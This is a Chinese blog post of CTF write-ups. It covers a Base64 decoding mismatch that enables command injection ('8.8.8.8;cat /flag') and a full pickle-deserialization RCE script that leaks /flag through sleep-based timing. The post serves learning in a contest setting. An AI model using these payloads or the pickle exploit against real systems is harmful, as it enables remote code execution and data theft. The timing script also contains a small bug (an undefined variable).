---
title: 🚩 NEX CTF 2025 Web 困难部分详细题解
date: 2025-10-27 21:48:33
tags:
- CTF
category: 安全
---

{%ablock color:orange ⚠️ 注意 %}

本文为我的 **个人** 解题思路，不代表组委会和任何官方看法，仅供参考。

{%endablock%}

## 一、神秘黑客的挑衅 - 变形的钥匙

<img src="https://imgsrc.chyk.ink/doCEY5fUm1w5A_09.webp" width="120px" />

### 题目内容

{%ablock%}

在最后的防线，你发现了 Rota 更高明的手段。与之前不同，这个系统对用户输入有着严格的审查，那些“明显”的试探都会被无情拦截。

然而，在一份陈旧的技术文档脚注中，你发现了这样一句话：**“系统在理解某些‘标准化格式’时，表现并不总是与预期一致。”**

Rota 在最后的消息中带着一丝戏谑：“当大门紧闭时，何不试试用他们自己的钥匙？只是...稍微用另一种方式握着它。”

[📥 题目附件](https://imgsrc.chyk.ink/EToZKAx1y-4nqNxB.zip)

{%endablock%}

### 浏览源码

首先，下载题目附件并简要浏览源码。可以注意到，题目源码中的关键逻辑函数：

```python
def run_ping(ip_base64):
    try:
        decoded_ip = base64.b64decode(ip_base64).decode('utf-8')
        if not re.match(r'^\d+\.\d+\.\d+\.\d+$', decoded_ip):
            return False
        if decoded_ip.count('.') != 3:
            return False
        
        if not all(0 <= int(part) < 256 for part in decoded_ip.split('.')):
            return False
        if not ipaddress.ip_address(decoded_ip):
            return False
        if len(decoded_ip) > 15:
            return False
        if not re.match(r'^[A-Za-z0-9+/=]+$', ip_base64):
            return False
    except Exception as e:
        return False
    command = f"""echo "ping -c 1 $(echo '{ip_base64}' | base64 -d)" | sh"""
	
    # ... 运行命令并返回输出
```

后端程序接收前端传入的，Base64 编码的 IP `ip_base64`，使用 Python 的 `b64decode` 进行解码并进行一连串的验证，确保它是合法的 IP 地址，之后，再拼接命令，把原本的 `ip_base64` 传给 `base64 -d` 解码并作为 ping 的参数运行。看似万无一失，但作为 CTF 题目，总是会有绕过的办法。

题目中有提到一种「标准化格式」，表现与预期不一致，那看来问题就出在 Base64 上了。

### Base64 编解码方式分析

上网搜索 `base64 编码方式`，找到 [这篇博文](www.cnblogs.com/zxhoo/p/19078233)，下面是核心节选：

{%ablock%}

它的工作原理可以概括为 **“三变四”** 和 **“查表”**。

**步骤 1：将二进制数据分成 3 字节一组（24位）**
二进制数据本质上是01串，但通常以字节（Byte）为单位。1字节 = 8位（bit）。Base64 每次取 **3 字节**（共 24 bits）作为一组进行处理。

**步骤 2：将 24 位分成 4 个 6 位的段**
将 24 bits 平均分成 **4 份**，每份就是 6 bits。

**步骤 3：将每个 6 位的值转换为对应的字符**
6 bits 的取值范围是 `000000` 到 `111111`（十进制是 0 到 63）。Base64 定义了一个包含 64 个字符的索引表。（此处节选省略）
每一个 6 位的值（0-63）都可以在上表中找到对应的字符。这样，原来的 3 字节二进制数据就变成了 4 个可打印的 ASCII 字符。

**步骤 4：处理不足位的情况（填充）**
如果数据的字节数不是 3 的倍数，最后一组会不足 3 字节。这时需要进行**填充（Padding）**：

- **缺1字节**：最后一组只有 2 字节（16 bits）。我们照样将其分成 3 个 6 位的段（需要18 bits），最后缺的 2 bits 用 `0` 补足。这样我们会得到 3 个 Base64 字符，但为了凑成 4 个，我们需要在第4个位置加上一个填充符 `=`。

- **缺2字节**：最后一组只有 1 字节（8 bits）。我们将其分成 2 个 6 位的段（需要12 bits），缺的 4 bits 用 `0` 补足。这样会得到 2 个 Base64 字符，并在第3和第4个位置加上两个填充符 `==`。

{%endablock%}

通过编码方式可以得知，Base64 解码时，也是四个字符一组进行的。要实现的话，写一个循环然后不断查表就行了。

那么，该何时终止这个循环呢？这里就有两种实现方式：

- 字符串结束时，直接终止循环。
- 遇到等于号 `=` 或字符串结束时，终止循环。因为等于号后面一定没有其它有效字符，可以省出处理一两个字符的时间。

### 尝试与实践

思考到这两种终止方式的不同后，我们尝试构造这样一个字符串：

`Y3V0ZQ==Y2F0`

即，把 `cute` 的编码 `Y3V0ZQ==` 和 `cat` 的编码 `Y2F0` 拼了起来。

<p><br></p>

首先尝试用 Python 解码：

```python
import base64
print(base64.b64decode("Y3V0ZQ==Y2F0".encode()).decode())
```

结果为 `cute`。看来，Python 在解码 Base64 时，采用我们想到的第二种终止方式。遇到等于号时，会直接终止解码。

再尝试用 `base64` 命令解码：

```bash
printf "Y3V0ZQ==Y2F0" | base64 -d
```

结果为 `cutecat`。`base64` 命令会无视等于号，解码完整个字符串。

那么再结合前两问，解题的方法就了然于心了。题目在 Python 层面做的一堆检查只对字符串前半截有效，而后半截会被传递给 shell。

```bash
echo $(printf '8.8.8.8'|base64)$(printf ';cat /flag'|base64)
OC44LjguOA==O2NhdCAvZmxhZw==

# base64 命令
printf 'OC44LjguOA==O2NhdCAvZmxhZw==' | base64 -d
8.8.8.8;cat /flag

# Python
>>> base64.b64decode(b'OC44LjguOA==O2NhdCAvZmxhZw==')
b'8.8.8.8'
```

使用 F12 编辑并重发，填入构造好的字符串，即可拿到 flag 内容。

## 二、逆流：数据迷踪 - 终极对决：静默任务执行

结合前两问，得知此题目考点为 Python `pickle` 模块的 RCE。看到无回显，第一反应是本地开个 Web 服务器，在题目靶机上把 Flag 发回来。

然而，题目标签里写着「不出网」。那么，我们还能拿到什么信息呢？这里来分享下我的思路。

既然「空间」维度被一刀切断，我们不妨切换一个维度，从「时间」上获取信息。既然我们在第二问已经拿到了任意代码执行权限，不妨直接使用 `sleep` 让请求睡一定的秒数来传递信息，就像发电报是通过按键时间的长短进行编码那样。

下面是解题代码，用时间传递 ASCII 编码。AI 辅助加入了错误处理机制，挂半个小时就能拿到 flag。

```python
import pickle
import requests
from io import BytesIO
import time
import math
import os

upload_api = 'http://sd11d3824zr1dbfz.neu-nex.fun/upload'

class NexNet:
    def __init__(self, index):
        self.index = index
    
    def __reduce__(self):
        return (exec, (f'import time; flag=open("/flag").read(); time.sleep((ord(flag[{self.index}])-32)*0.5)',))

class NoSleepNet:
    def __reduce__(self):
        return (exec, ('pass',))

def measure_network_delay():
    """测量网络延迟"""
    obj = NoSleepNet()
    start_time = time.perf_counter()
    response = requests.post(upload_api, files={
        'mission_file': (f'delay_test_{i}.pkl', BytesIO(pickle.dumps(obj)), 'application/octet-stream')
    })
    end_time = time.perf_counter()
    return end_time - start_time
    if i < samples - 1:
        time.sleep(0.2)

def get_flag_char(index, network_delay):
    """获取指定位置的flag字符，减去网络延迟"""
    obj = NexNet(index)
    
    start_time = time.perf_counter()
    response = requests.post(upload_api, files={
        'mission_file': (f'{index}.pkl', BytesIO(pickle.dumps(obj)), 'application/octet-stream')
    })
    end_time = time.perf_counter()
    
    elapsed = end_time - start_time - network_delay
    # 计算字符：sleep时间 = (ASCII码 - 32) * 0.5秒
    # 所以 ASCII码 = (sleep时间 / 0.5) + 32 = (sleep时间 * 2) + 32
    char_code = round(elapsed * 2) + 32
    return chr(char_code)

def load_existing_flag():
    """从flag.txt加载已有的flag，支持断点续传"""
    if os.path.exists('flag.txt'):
        with open('flag.txt', 'r') as f:
            flag = f.read().strip()
        print(f"从flag.txt加载已有flag: {flag}")
        return flag
    else:
        return ""

def update_flag_file(flag):
    """更新flag.txt文件"""
    with open('flag.txt', 'w') as f:
        f.write(flag)
    print(f"已更新flag.txt: {flag}")

def validate_char(char):
    """验证字符是否合理"""
    if 32 <= ord(char) <= 126:
        return True
    return False

def main():
    flag = load_existing_flag()
    print("开始读取flag...")
    
    index = len(flag)
    consecutive_errors = 0
    max_consecutive_errors = 3
    
    while True:
        try:
            current_delay = measure_network_delay()
            char = get_flag_char(index, current_delay)
            
            if validate_char(char):
                print(f"位置 {index} 的字符: '{char}' (ASCII: {ord(char)})")
                flag += char
                update_flag_file(flag)
                consecutive_errors = 0
                
                if char == '}':
                    print("检测到flag结束符 '}'，读取完成！")
                    break
                    
                index += 1
            else:
                print(f"位置 {index} 读取到无效字符: ASCII {ord(char)}")
                consecutive_errors += 1
                
            time.sleep(0.5)
            
            if consecutive_errors >= max_consecutive_errors:
                print("连续错误过多，停止读取")
                break
                
        except Exception as e:
            print(f"读取位置 {index} 时出错: {e}")
            consecutive_errors += 1
            
            if consecutive_errors >= max_consecutive_errors:
                print("连续错误过多，停止读取")
                break
                
            index += 1
            continue
    
    print(f"\n最终flag: {flag}")
    print(f"flag长度: {len(flag)}")

if __name__ == "__main__":
    main()
```

所以，当一个维度受阻时，不妨更换思路，从另外的角度思考，没准就能得到解决办法。
